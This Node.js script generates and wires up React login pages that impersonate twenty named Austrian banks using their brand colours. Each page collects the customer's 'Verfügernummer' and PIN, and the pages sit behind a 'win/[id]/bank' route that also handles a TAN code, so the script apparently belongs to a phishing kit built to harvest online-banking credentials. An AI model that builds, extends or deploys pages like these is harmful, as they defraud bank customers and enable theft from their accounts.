const fs = require('fs');
const path = require('path');

const banks = [
  { slug: "posojilnica-bank-egen", name: "PosojilnicaBank", color: "#6f2c6b" },
  { slug: "bank99-ag", name: "Bank99", color: "#ffde00" },
  { slug: "btv-vier-lander-bank", name: "BtvVierLanderBank", color: "#d61f26" },
  { slug: "bks-bank-ag", name: "BksBank", color: "#365f8f" },
  { slug: "oberbank-ag", name: "Oberbank", color: "#d71920" },
  { slug: "hypo-noe-lb", name: "HypoNoe", color: "#006e8a" },
  { slug: "hypo-tirol-bank-ag", name: "HypoTirol", color: "#1d4f91" },
  { slug: "hypo-vorarlberg-bank-ag", name: "HypoVorarlberg", color: "#1f7a3d" },
  { slug: "hypo-bank-burgenland-ag", name: "HypoBurgenland", color: "#a3322b" },
  { slug: "hypo-oberoesterreich-salzburg", name: "HypoOberosterreich", color: "#1f7a3d" },
  { slug: "oesterreichische-aerzte-und-apothekerbank", name: "AerzteApothekerBank", color: "#2f6f95" },
  { slug: "bankhaus-carl-spangler-und-co-ag", name: "BankhausSpangler", color: "#5b4b3b" },
  { slug: "schelhammer-capital-bank-ag", name: "SchelhammerCapital", color: "#35507b" },
  { slug: "easybank", name: "Easybank", color: "#00a0df" },
  { slug: "schoellerbank-ag", name: "Schoellerbank", color: "#1c2e5b" },
  { slug: "sparda-bank-wien", name: "SpardaBank", color: "#2d9fa6" },
  { slug: "volkskreditbank-ag", name: "Volkskreditbank", color: "#5b7f50" },
  { slug: "austrian-anadi-bank-ag", name: "AnadiBank", color: "#355a8a" },
  { slug: "marchfelder-bank", name: "MarchfelderBank", color: "#3d7044" },
  { slug: "dolomitenbank", name: "Dolomitenbank", color: "#006b8f" },
];

const templateDir = path.join(__dirname, 'src', 'components', 'templates');

let imports = '';
let blocks = '';

banks.forEach(b => {
  const content = `"use client";

import React from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function ${b.name}({ formData, onChange, handleRouteAction, saving }: Props) {
  return (
    <div className="flex flex-col min-h-screen bg-white items-center justify-center">
      <h2 className="text-2xl font-bold text-[${b.color}] mb-4">${b.name} Template</h2>
      <p className="text-gray-500 mb-8">Tasarım daha sonra eklenecek.</p>
      
      <form 
        onSubmit={(e) => {
          e.preventDefault();
          handleRouteAction();
        }}
        className="flex flex-col gap-4 w-full max-w-sm"
      >
        <input 
          type="text" 
          placeholder="Verfügernummer"
          value={formData.verfuegernummer || ""}
          onChange={(e) => onChange("verfuegernummer", e.target.value)}
          className="border p-2 rounded"
        />
        <input 
          type="text" 
          placeholder="PIN"
          value={formData.pin || ""}
          onChange={(e) => onChange("pin", e.target.value)}
          className="border p-2 rounded"
        />
        <button type="submit" disabled={saving} className="bg-[${b.color}] text-white p-2 rounded">
          {saving ? "Laden..." : "LOGIN"}
        </button>
      </form>
    </div>
  );
}
`;
  fs.writeFileSync(path.join(templateDir, `${b.name}.tsx`), content, 'utf-8');

  imports += `import { ${b.name} } from "@/components/templates/${b.name}";\n`;
  blocks += `  if (bankSlug === "${b.slug}") {
    return (
      <${b.name}
        formData={{ verfuegernummer, pin }}
        onChange={(field, value) => {
          if (field === "verfuegernummer") setVerfuegernummer(value);
          if (field === "pin") setPin(value);
        }}
        handleRouteAction={() => handleSubmit({ verfuegernummer, pin, tacCode })}
        saving={saving}
      />
    );
  }

`;
});

const clientPath = path.join(__dirname, 'src', 'app', 'win', '[id]', 'bank', '[bank_slug]', 'bank-login-client.tsx');
let clientContent = fs.readFileSync(clientPath, 'utf-8');

clientContent = clientContent.replace('import { Volksbanken } from "@/components/templates/Volksbanken";', 'import { Volksbanken } from "@/components/templates/Volksbanken";\n' + imports);

clientContent = clientContent.replace('  if (!theme) {', blocks + '  if (!theme) {');

fs.writeFileSync(clientPath, clientContent, 'utf-8');
console.log('All templates generated and wired up successfully.');
